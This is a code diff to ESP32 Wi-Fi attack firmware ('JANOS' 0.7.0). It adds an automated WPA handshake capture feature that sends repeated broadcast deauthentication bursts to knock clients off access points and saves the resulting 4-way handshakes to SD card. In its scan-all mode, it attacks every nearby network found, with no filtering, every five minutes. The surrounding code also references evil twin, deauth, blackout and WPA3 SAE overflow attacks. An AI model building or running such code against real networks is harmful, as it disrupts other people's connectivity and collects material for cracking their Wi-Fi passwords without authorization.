@@ -56,6 +56,10 @@
 #include "lwip/netdb.h"
 #include "lwip/dns.h"
 #include "lwip/dhcp.h"
+
+#include "attack_handshake.h"
+#include "hccapx_serializer.h"
+
 #include "esp_rom_sys.h"
 #include "soc/soc.h"
 
@@ -77,7 +81,7 @@
 #endif
 
 //Version number
-#define JANOS_VERSION "0.6.5"
+#define JANOS_VERSION "0.7.0"
 
 
 #define NEOPIXEL_GPIO      27
@@ -242,6 +246,21 @@ static int64_t sniffer_dog_last_channel_hop = 0;
 
 // Wardrive task
 static TaskHandle_t wardrive_task_handle = NULL;
+
+// Handshake attack task
+static TaskHandle_t handshake_attack_task_handle = NULL;
+static volatile bool handshake_attack_active = false;
+static bool handshake_selected_mode = false; // true if networks were selected, false for scan-all mode
+static wifi_ap_record_t handshake_targets[MAX_AP_CNT]; // Copy of target networks
+static int handshake_target_count = 0;
+static bool handshake_captured[MAX_AP_CNT]; // Track which networks have captured handshakes
+static int handshake_current_index = 0;
+
+// Channel lists for 2.4GHz and 5GHz
+static const uint8_t channels_24ghz[] = {1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10, 12, 13};
+static const uint8_t channels_5ghz[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
+#define NUM_CHANNELS_24GHZ (sizeof(channels_24ghz) / sizeof(channels_24ghz[0]))
+#define NUM_CHANNELS_5GHZ (sizeof(channels_5ghz) / sizeof(channels_5ghz[0]))
 
 // Portal state
 static httpd_handle_t portal_server = NULL;
@@ -582,6 +601,8 @@ static int cmd_scan_networks(int argc, char **argv);
 static int cmd_show_scan_results(int argc, char **argv);
 static int cmd_select_networks(int argc, char **argv);
 static int cmd_start_evil_twin(int argc, char **argv);
+static int cmd_start_handshake(int argc, char **argv);
+static int cmd_save_handshake(int argc, char **argv);
 static int cmd_start_wardrive(int argc, char **argv);
 static int cmd_start_sniffer(int argc, char **argv);
 static int cmd_packet_monitor(int argc, char **argv);
@@ -615,6 +636,11 @@ static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan
 static void deauth_attack_task(void *pvParameters);
 static void blackout_attack_task(void *pvParameters);
 static void sae_attack_task(void *pvParameters);
+static void handshake_attack_task(void *pvParameters);
+static bool check_handshake_file_exists(const char *ssid);
+static void handshake_cleanup(void);
+static void quick_scan_all_channels(void);
+static void attack_network_with_burst(const wifi_ap_record_t *ap);
 // DNS server task
 static void dns_server_task(void *pvParameters);
 // Portal HTTP handlers
@@ -834,7 +860,8 @@ static void wifi_event_handler(void *event_handler_arg,
         }
         case WIFI_EVENT_AP_STADISCONNECTED: {
             const wifi_event_ap_stadisconnected_t *e = (const wifi_event_ap_stadisconnected_t *)event_data;
-            // Client disconnected
+            MY_LOG_INFO(TAG, "AP: Client disconnected - MAC: %02X:%02X:%02X:%02X:%02X:%02X, AID: %u, reason: %u",
+                        e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5], e->aid, e->reason);
             
             // Decrement connected clients counter
             if (portal_connected_clients > 0) {
@@ -1784,6 +1811,24 @@ static int cmd_select_networks(int argc, char **argv) {
         ESP_LOGW(TAG,"Syntax: select_networks <index1> [index2] ...");
         return 1;
     }
+
+    // Wait for scan to finish to avoid selecting with empty results
+    if (g_scan_in_progress) {
+        MY_LOG_INFO(TAG, "Scan in progress - waiting to finish before selecting networks...");
+        int wait_loops = 0;
+        // wait up to ~10s (100ms * 100) for scan to complete
+        while (g_scan_in_progress && wait_loops < 100) {
+            vTaskDelay(pdMS_TO_TICKS(100));
+            wait_loops++;
+        }
+    }
+
+    // If still no results, abort selection
+    if (!g_scan_done || g_scan_count == 0) {
+        ESP_LOGW(TAG,"No scan results yet. Run scan_networks and wait for completion.");
+        return 1;
+    }
+
     g_selected_count = 0;
     for (int i = 1; i < argc && g_selected_count < MAX_AP_CNT; ++i) {
         int idx = atoi(argv[i]);
@@ -2033,9 +2078,446 @@ static void blackout_attack_task(void *pvParameters) {
     vTaskDelete(NULL); // Delete this task
 }
 
+// Helper function to check if handshake file already exists for a given SSID
+static bool check_handshake_file_exists(const char *ssid) {
+    char ssid_safe[33];
+    
+    // Sanitize SSID for filename
+    strncpy(ssid_safe, ssid, sizeof(ssid_safe) - 1);
+    ssid_safe[sizeof(ssid_safe) - 1] = '\0';
+    for (int i = 0; ssid_safe[i]; i++) {
+        if (ssid_safe[i] == ' ' || ssid_safe[i] == '/' || ssid_safe[i] == '\\') {
+            ssid_safe[i] = '_';
+        }
+    }
+    
+    // Check if any PCAP file exists for this SSID
+    DIR *dir = opendir("/sdcard/lab/handshakes");
+    if (dir == NULL) {
+        return false; // Directory doesn't exist, so no files exist
+    }
+    
+    struct dirent *entry;
+    bool found = false;
+    while ((entry = readdir(dir)) != NULL) {
+        // Check if filename starts with the SSID and ends with .pcap
+        if (strncmp(entry->d_name, ssid_safe, strlen(ssid_safe)) == 0 &&
+            strstr(entry->d_name, ".pcap") != NULL) {
+            found = true;
+            break;
+        }
+    }
+    
+    closedir(dir);
+    return found;
+}
+
+// Cleanup function for handshake attack
+static void handshake_cleanup(void) {
+    MY_LOG_INFO(TAG, "Handshake attack cleanup...");
+    
+    // Stop any active handshake attack
+    attack_handshake_stop();
+    
+    // Reset state
+    handshake_attack_active = false;
+    handshake_attack_task_handle = NULL;
+    handshake_target_count = 0;
+    handshake_current_index = 0;
+    memset(handshake_targets, 0, sizeof(handshake_targets));
+    memset(handshake_captured, 0, sizeof(handshake_captured));
+    
+    // Restore idle LED
+    esp_err_t led_err = led_set_idle();
+    if (led_err != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to restore idle LED: %s", esp_err_to_name(led_err));
+    }
+    
+    MY_LOG_INFO(TAG, "Handshake attack cleanup complete.");
+}
+
+// Quick scan all channels (both 2.4GHz and 5GHz) - 500ms per channel
+static void quick_scan_all_channels(void) {
+    MY_LOG_INFO(TAG, "Quick scanning all channels (2.4GHz + 5GHz)...");
+    
+    // Scan 2.4GHz channels
+    for (int i = 0; i < NUM_CHANNELS_24GHZ && handshake_attack_active && !operation_stop_requested; i++) {
+        uint8_t channel = channels_24ghz[i];
+        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        vTaskDelay(pdMS_TO_TICKS(500)); // 500ms per channel
+        
+        // Scan would happen here via background scan
+        // For now we'll use the global scan results
+    }
+    
+    // Scan 5GHz channels  
+    for (int i = 0; i < NUM_CHANNELS_5GHZ && handshake_attack_active && !operation_stop_requested; i++) {
+        uint8_t channel = channels_5ghz[i];
+        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        vTaskDelay(pdMS_TO_TICKS(500)); // 500ms per channel
+    }
+    
+    MY_LOG_INFO(TAG, "Channel scan complete");
+}
+
+// Attack network with deauth burst (5 packets)
+static void attack_network_with_burst(const wifi_ap_record_t *ap) {
+    MY_LOG_INFO(TAG, "Burst attacking '%s' (Ch %d, RSSI: %d dBm)", 
+                ap->ssid, ap->primary, ap->rssi);
+    
+    // Start attack on this network
+    attack_handshake_start(ap, ATTACK_HANDSHAKE_METHOD_BROADCAST);
+    
+    // Send initial burst (attack_handshake_start already sends first deauth)
+    // The timer will continue sending every 2s
+    
+    // Wait and check for handshake - 3 deauth bursts with 3s wait each
+    for (int burst = 0; burst < 3 && handshake_attack_active && !operation_stop_requested; burst++) {
+        // Wait 3 seconds for clients to reconnect after deauth
+        for (int i = 0; i < 30 && handshake_attack_active && !operation_stop_requested; i++) {
+            vTaskDelay(pdMS_TO_TICKS(100));
+            
+            // Check if handshake captured
+            if (attack_handshake_is_complete()) {
+                MY_LOG_INFO(TAG, "✓ Handshake captured for '%s' after burst #%d!", 
+                           ap->ssid, burst + 1);
+                
+                // Wait 2s to capture any remaining frames
+                vTaskDelay(pdMS_TO_TICKS(2000));
+                attack_handshake_stop();
+                return; // Success!
+            }
+        }
+        
+        MY_LOG_INFO(TAG, "Burst #%d complete, trying next...", burst + 1);
+    }
+    
+    // No handshake captured after 3 bursts
+    MY_LOG_INFO(TAG, "✗ No handshake for '%s' after 3 bursts", ap->ssid);
+    attack_handshake_stop();
+}
+
+// Handshake attack task - Pwnagotchi-style hybrid approach
+static void handshake_attack_task(void *pvParameters) {
+    (void)pvParameters;
+    
+    MY_LOG_INFO(TAG, "Handshake attack task started.");
+    MY_LOG_INFO(TAG, "Mode: %s", handshake_selected_mode ? "Selected networks only" : "Scan all networks periodically");
+    
+    // Set LED to cyan for handshake attack
+    esp_err_t led_err = led_set_color(0, 255, 255); // Cyan
+    if (led_err != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to set LED for handshake attack: %s", esp_err_to_name(led_err));
+    }
+    
+    int64_t last_scan_time = 0;
+    const int64_t SCAN_INTERVAL_US = 5 * 60 * 1000000; // 5 minutes in microseconds
+    
+    while (handshake_attack_active && !operation_stop_requested) {
+        // In non-selected mode, do periodic scans
+        if (!handshake_selected_mode) {
+            int64_t current_time = esp_timer_get_time();
+            if (current_time - last_scan_time >= SCAN_INTERVAL_US || handshake_target_count == 0) {
+                MY_LOG_INFO(TAG, "Performing periodic scan for networks...");
+                
+                // Start background scan
+                esp_err_t scan_result = start_background_scan();
+                if (scan_result != ESP_OK) {
+                    MY_LOG_INFO(TAG, "Failed to start scan: %s", esp_err_to_name(scan_result));
+                    vTaskDelay(pdMS_TO_TICKS(5000));
+                    continue;
+                }
+                
+                // Wait for scan to complete
+                int timeout = 0;
+                while (g_scan_in_progress && timeout < 200 && handshake_attack_active && !operation_stop_requested) {
+                    vTaskDelay(pdMS_TO_TICKS(100));
+                    timeout++;
+                }
+                
+                if (operation_stop_requested) {
+                    MY_LOG_INFO(TAG, "Stop requested during scan, terminating...");
+                    break;
+                }
+                
+                if (g_scan_in_progress || !g_scan_done || g_scan_count == 0) {
+                    MY_LOG_INFO(TAG, "Scan failed or no results, retrying in 5 seconds...");
+                    vTaskDelay(pdMS_TO_TICKS(5000));
+                    continue;
+                }
+                
+                // Copy scan results to handshake targets
+                handshake_target_count = (g_scan_count < MAX_AP_CNT) ? g_scan_count : MAX_AP_CNT;
+                memcpy(handshake_targets, g_scan_results, handshake_target_count * sizeof(wifi_ap_record_t));
+                handshake_current_index = 0;
+                
+                MY_LOG_INFO(TAG, "Found %d networks to attack", handshake_target_count);
+                last_scan_time = current_time;
+            }
+        }
+        
+        // Check if we're done with all selected networks
+        if (handshake_selected_mode) {
+            bool all_captured = true;
+            for (int i = 0; i < handshake_target_count; i++) {
+                if (!handshake_captured[i]) {
+                    all_captured = false;
+                    break;
+                }
+            }
+            
+            if (all_captured) {
+                MY_LOG_INFO(TAG, "All selected networks have been captured! Attack complete.");
+                break;
+            }
+        }
+        
+        // Pwnagotchi-style attack strategy
+        if (handshake_selected_mode) {
+            MY_LOG_INFO(TAG, "===== Selected Networks Mode =====");
+            MY_LOG_INFO(TAG, "Attacking %d selected networks in loop until all captured", handshake_target_count);
+            MY_LOG_INFO(TAG, "Strategy: Deauth burst (5 packets) every 1s, 3 bursts per network");
+        } else {
+            MY_LOG_INFO(TAG, "===== Scan-All Mode (Pwnagotchi-style) =====");
+            MY_LOG_INFO(TAG, "1. Quick scan ALL channels (2.4GHz + 5GHz)");
+            MY_LOG_INFO(TAG, "2. Attack ALL networks found (no filtering)");
+            MY_LOG_INFO(TAG, "3. Deauth burst (5 packets) every 1s, 3 bursts per network");
+            
+            // PHASE 1: Quick scan all channels (only in scan-all mode)
+            MY_LOG_INFO(TAG, "");
+            MY_LOG_INFO(TAG, "===== PHASE 1: Quick Channel Scan =====");
+            
+            int total_channels = NUM_CHANNELS_24GHZ + NUM_CHANNELS_5GHZ;
+            MY_LOG_INFO(TAG, "Scanning %d channels (%d x 2.4GHz + %d x 5GHz) @ 500ms each...",
+                       total_channels, NUM_CHANNELS_24GHZ, NUM_CHANNELS_5GHZ);
+            
+            // This will take about: (13 + 25) * 0.5s = 19 seconds
+            quick_scan_all_channels();
+        }
+        
+        // PHASE 2: Attack networks
+        MY_LOG_INFO(TAG, "");
+        if (handshake_selected_mode) {
+            MY_LOG_INFO(TAG, "===== Attacking Selected Networks =====");
+        } else {
+            MY_LOG_INFO(TAG, "===== PHASE 2: Attack All Networks =====");
+        }
+        MY_LOG_INFO(TAG, "Attacking %d networks...", handshake_target_count);
+        
+        // Attack all networks regardless of signal strength
+        int attacked_count = 0;
+        int captured_count = 0;
+        
+        for (int i = 0; i < handshake_target_count && handshake_attack_active && !operation_stop_requested; i++) {
+            wifi_ap_record_t *ap = &handshake_targets[i];
+            
+            // Skip if already captured
+            if (handshake_captured[i]) {
+                continue;
+            }
+            
+            // Check if file already exists
+            if (check_handshake_file_exists((const char*)ap->ssid)) {
+                MY_LOG_INFO(TAG, "[%d/%d] Skipping '%s' - PCAP already exists", 
+                           i + 1, handshake_target_count, (const char*)ap->ssid);
+                handshake_captured[i] = true;
+                captured_count++;
+                continue;
+            }
+            
+            attacked_count++;
+            MY_LOG_INFO(TAG, "");
+            MY_LOG_INFO(TAG, ">>> [%d/%d] Attacking '%s' (Ch %d, RSSI: %d dBm) <<<", 
+                       i + 1, handshake_target_count, (const char*)ap->ssid, ap->primary, ap->rssi);
+            
+            // Attack with burst strategy
+            attack_network_with_burst(ap);
+            
+            // Check if captured
+            if (attack_handshake_is_complete()) {
+                handshake_captured[i] = true;
+                captured_count++;
+                MY_LOG_INFO(TAG, "✓✓✓ Handshake #%d captured! ✓✓✓", captured_count);
+            }
+            
+            // Delay before next network (channel stabilization)
+            if (i < handshake_target_count - 1) {
+                MY_LOG_INFO(TAG, "Cooling down 2s before next network...");
+                vTaskDelay(pdMS_TO_TICKS(2000));
+            }
+        }
+        
+        MY_LOG_INFO(TAG, "");
+        MY_LOG_INFO(TAG, "===== Attack Cycle Complete =====");
+        MY_LOG_INFO(TAG, "Total networks: %d", handshake_target_count);
+        MY_LOG_INFO(TAG, "Networks attacked this cycle: %d", attacked_count);
+        MY_LOG_INFO(TAG, "Handshakes captured so far: %d", captured_count);
+        
+        // Check if all selected networks captured (for selected mode)
+        if (handshake_selected_mode) {
+            bool all_done = true;
+            int remaining = 0;
+            for (int i = 0; i < handshake_target_count; i++) {
+                if (!handshake_captured[i]) {
+                    all_done = false;
+                    remaining++;
+                }
+            }
+            
+            if (all_done) {
+                MY_LOG_INFO(TAG, "✓✓✓ All selected networks captured! Attack complete. ✓✓✓");
+                break;
+            }
+            
+            // Continue looping until all captured
+            MY_LOG_INFO(TAG, "Selected mode: %d networks still need handshakes, repeating attack cycle...", remaining);
+            vTaskDelay(pdMS_TO_TICKS(3000)); // Small delay before next loop
+        } else {
+            // In non-selected mode, wait before next scan cycle
+            MY_LOG_INFO(TAG, "Scan-all mode: Waiting for next scan interval...");
+            vTaskDelay(pdMS_TO_TICKS(10000)); // Wait 10 seconds before checking scan interval
+        }
+    }
+    
+    // Cleanup
+    handshake_cleanup();
+    
+    MY_LOG_INFO(TAG, "Handshake attack task finished.");
+    vTaskDelete(NULL);
+}
+
 static int cmd_start_deauth(int argc, char **argv) {
     onlyDeauth = 1;
     return cmd_start_evil_twin(argc, argv);
+}
+
+static int cmd_start_handshake(int argc, char **argv) {
+    // Check if handshake attack is already running
+    if (handshake_attack_active || handshake_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Handshake attack already running. Use 'stop' to stop it first.");
+        return 1;
+    }
+
+    // Optional: allow passing indexes directly (like "start_handshake 13 14")
+    if (argc > 1) {
+        // If a scan is still running, wait briefly for completion
+        if (g_scan_in_progress) {
+            MY_LOG_INFO(TAG, "Scan in progress - waiting to finish before starting handshake...");
+            int wait_loops = 0;
+            while (g_scan_in_progress && wait_loops < 100) { // ~10s max
+                vTaskDelay(pdMS_TO_TICKS(100));
+                wait_loops++;
+            }
+        }
+
+        if (!g_scan_done || g_scan_count == 0) {
+            MY_LOG_INFO(TAG, "No scan results yet. Run scan_networks first.");
+            return 1;
+        }
+
+        // Build selection from provided indexes (1-based like UI)
+        g_selected_count = 0;
+        for (int i = 1; i < argc && g_selected_count < MAX_AP_CNT; ++i) {
+            int idx = atoi(argv[i]) - 1;
+            if (idx < 0 || idx >= (int)g_scan_count) {
+                ESP_LOGW(TAG,"Index %d out of bounds (1..%u)", idx + 1, g_scan_count);
+                continue;
+            }
+            g_selected_indices[g_selected_count++] = idx;
+        }
+
+        if (g_selected_count == 0) {
+            MY_LOG_INFO(TAG, "No valid targets from arguments. Aborting handshake.");
+            return 1;
+        }
+    }
+    
+    // Reset stop flag
+    operation_stop_requested = false;
+    
+    // Initialize state
+    handshake_target_count = 0;
+    handshake_current_index = 0;
+    memset(handshake_targets, 0, sizeof(handshake_targets));
+    memset(handshake_captured, 0, sizeof(handshake_captured));
+    
+    // Check if networks were selected
+    if (g_selected_count > 0) {
+        // Selected networks mode
+        handshake_selected_mode = true;
+        handshake_target_count = g_selected_count;
+        
+        MY_LOG_INFO(TAG, "Starting WPA Handshake Capture - Selected Networks Mode");
+        MY_LOG_INFO(TAG, "Targets: %d network(s)", g_selected_count);
+        
+        // Copy selected networks to handshake targets
+        for (int i = 0; i < g_selected_count; i++) {
+            int idx = g_selected_indices[i];
+            memcpy(&handshake_targets[i], &g_scan_results[idx], sizeof(wifi_ap_record_t));
+            MY_LOG_INFO(TAG, "  [%d] SSID='%s' Ch=%d", 
+                       i + 1, (const char*)handshake_targets[i].ssid, handshake_targets[i].primary);
+        }
+        
+        MY_LOG_INFO(TAG, "Will spend max 40s on each network");
+        MY_LOG_INFO(TAG, "Will stop automatically when all networks captured");
+    } else {
+        // Scan-all mode
+        handshake_selected_mode = false;
+        
+        MY_LOG_INFO(TAG, "Starting WPA Handshake Capture - Scan All Mode");
+        MY_LOG_INFO(TAG, "No networks selected - will scan and attack all networks");
+        MY_LOG_INFO(TAG, "Periodic scan every 5 minutes");
+        MY_LOG_INFO(TAG, "Will run until 'stop' command");
+        
+        // Do initial scan
+        if (g_scan_count > 0) {
+            handshake_target_count = (g_scan_count < MAX_AP_CNT) ? g_scan_count : MAX_AP_CNT;
+            memcpy(handshake_targets, g_scan_results, handshake_target_count * sizeof(wifi_ap_record_t));
+            MY_LOG_INFO(TAG, "Using %d networks from last scan", handshake_target_count);
+        } else {
+            MY_LOG_INFO(TAG, "No previous scan results - will scan on startup");
+        }
+    }
+    
+    MY_LOG_INFO(TAG, "Method: Broadcast deauth + passive capture");
+    MY_LOG_INFO(TAG, "Handshakes will be saved automatically to SD card");
+    MY_LOG_INFO(TAG, "Use 'stop' to stop the attack");
+    
+    // Start handshake attack task
+    handshake_attack_active = true;
+    BaseType_t result = xTaskCreate(
+        handshake_attack_task,
+        "handshake_attack",
+        8192,  // Stack size
+        NULL,
+        5,     // Priority
+        &handshake_attack_task_handle
+    );
+    
+    if (result != pdPASS) {
+        MY_LOG_INFO(TAG, "Failed to create handshake attack task!");
+        handshake_attack_active = false;
+        return 1;
+    }
+    
+    return 0;
+}
+
+static int cmd_save_handshake(int argc, char **argv) {
+    // Avoid compiler warnings
+    (void)argc; (void)argv;
+    
+    MY_LOG_INFO(TAG, "Manually saving handshake to SD card...");
+    
+    if (attack_handshake_save_to_sd()) {
+        MY_LOG_INFO(TAG, "✓ Handshake saved successfully!");
+        MY_LOG_INFO(TAG, "Files saved to: /sdcard/lab/handshakes/");
+        return 0;
+    } else {
+        MY_LOG_INFO(TAG, "✗ Failed to save - no complete 4-way handshake captured");
+        MY_LOG_INFO(TAG, "Make sure you captured all 4 messages of the handshake");
+        return 1;
+    }
 }
 
 static int cmd_start_sae_overflow(int argc, char **argv) {
@@ -2451,6 +2933,36 @@ static int cmd_stop(int argc, char **argv) {
 
     // Stop packet monitor if running
     packet_monitor_stop();
+
+    // Stop handshake attack task if running
+    if (handshake_attack_active || handshake_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Stopping handshake attack task...");
+        handshake_attack_active = false;
+        
+        // Wait a bit for task to finish
+        for (int i = 0; i < 20 && handshake_attack_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        // Force delete if still running
+        if (handshake_attack_task_handle != NULL) {
+            vTaskDelete(handshake_attack_task_handle);
+            handshake_attack_task_handle = NULL;
+            MY_LOG_INFO(TAG, "Handshake attack task forcefully stopped.");
+        }
+        
+        // Stop any active handshake capture
+        attack_handshake_stop();
+        
+        // Clean up state
+        handshake_target_count = 0;
+        handshake_current_index = 0;
+        memset(handshake_targets, 0, sizeof(handshake_targets));
+        memset(handshake_captured, 0, sizeof(handshake_captured));
+    } else {
+        // Stop handshake attack if running (old non-task mode)
+        attack_handshake_stop();
+    }
 
     // Stop channel view monitor if running
     channel_view_stop();
@@ -5085,6 +5597,24 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&deauth_cmd));
 
+    const esp_console_cmd_t handshake_cmd = {
+        .command = "start_handshake",
+        .help = "Starts WPA Handshake capture attack. With selected networks: attacks only those. Without: scans every 5min and attacks all.",
+        .hint = NULL,
+        .func = &cmd_start_handshake,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&handshake_cmd));
+
+    const esp_console_cmd_t save_handshake_cmd = {
+        .command = "save_handshake",
+        .help = "Manually saves captured handshake to SD card (only if complete 4-way handshake).",
+        .hint = NULL,
+        .func = &cmd_save_handshake,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&save_handshake_cmd));
+
        const esp_console_cmd_t sae_overflow_cmd = {
         .command = "sae_overflow",
         .help = "Starts SAE WPA3 Client Overflow attack.",
@@ -5223,6 +5753,8 @@ static void register_commands(void)
 
 void app_main(void) {
 
+    printf("\n\n=== APP_MAIN START (v" JANOS_VERSION ") ===\n");
+    
     // esp_log_level_set("wifi", ESP_LOG_INFO);
     // esp_log_level_set("projectZero", ESP_LOG_INFO);
     // esp_log_level_set("espnow", ESP_LOG_INFO);
@@ -5231,25 +5763,35 @@ void app_main(void) {
     // esp_log_level_set(TAG, ESP_LOG_DEBUG);
     // esp_log_level_set("espnow", ESP_LOG_DEBUG);
 
-
-    //MY_LOG_INFO(TAG, "Application starts (ESP32-C5)");
-
+#ifdef CONFIG_SPIRAM
+    printf("Step 1: Manual PSRAM init\n");
+    
+    // Manual PSRAM initialization (CONFIG_SPIRAM_BOOT_INIT=n)
     esp_err_t ret1 = esp_psram_init();
     if (ret1 == ESP_OK) {
         size_t psram_size = esp_psram_get_size();
-        MY_LOG_INFO(TAG, "PSRAM size: %d bytes\n", psram_size);
+        printf("PSRAM initialized successfully, size: %zu bytes\n", psram_size);
+        
+        printf("Step 2: Test PSRAM malloc\n");
+        void* ptr = heap_caps_malloc(1024, MALLOC_CAP_SPIRAM);
+        if (ptr != NULL) {
+            printf("Malloc from PSRAM succeeded\n");
+            heap_caps_free(ptr);
+        } else {
+            printf("Malloc from PSRAM failed\n");
+        }
     } else {
-        MY_LOG_INFO(TAG, "PSRAM not detected\n");
+        printf("PSRAM init failed: %s (continuing without PSRAM)\n", esp_err_to_name(ret1));
     }
+#else
+    printf("PSRAM support disabled in config\n");
+#endif
 
-    void* ptr = heap_caps_malloc(1024, MALLOC_CAP_SPIRAM);
-    if (ptr != NULL) {
-        MY_LOG_INFO(TAG, "Malloc from PSRAM succeeded\n");
-        heap_caps_free(ptr);
-    } else {
-        MY_LOG_INFO(TAG, "Malloc from PSRAM failed\n");
-    }
+    printf("Step 3: Init NVS\n");
+    ESP_ERROR_CHECK(nvs_flash_init());
+    printf("NVS initialized OK\n");
 
+    printf("Step 4: Init LED strip\n");
     // 1. LED strip configuration
     led_strip_config_t strip_cfg = {
         .strip_gpio_num            = NEOPIXEL_GPIO,
@@ -5268,11 +5810,12 @@ void app_main(void) {
 
     // 3. strip instance
     ESP_ERROR_CHECK(led_strip_new_rmt_device(&strip_cfg, &rmt_cfg, &strip));
-
-    ESP_ERROR_CHECK(nvs_flash_init());
+    printf("LED strip initialized OK\n");
 
     led_initialized = true;
+    printf("Step 5: LED boot sequence\n");
     led_boot_sequence();
+    printf("Step 6: Vendor load state\n");
     MY_LOG_INFO(TAG, "Status LED ready (brightness %u%%, %s)", led_brightness_percent, led_user_enabled ? "on" : "off");
     vendor_load_state_from_nvs();
     vendor_last_valid = false;
@@ -5281,9 +5824,12 @@ void app_main(void) {
     vendor_file_checked = false;
     vendor_file_present = false;
     vendor_record_count = 0;
+    printf("Step 7: Boot config load\n");
     boot_config_load_from_nvs();
 
-    ESP_ERROR_CHECK(wifi_init_ap_sta()); 
+    printf("Step 8: WiFi init\n");
+    ESP_ERROR_CHECK(wifi_init_ap_sta());
+    printf("WiFi initialized OK\n"); 
 
     wifi_country_t wifi_country = {
         .cc = "PH",
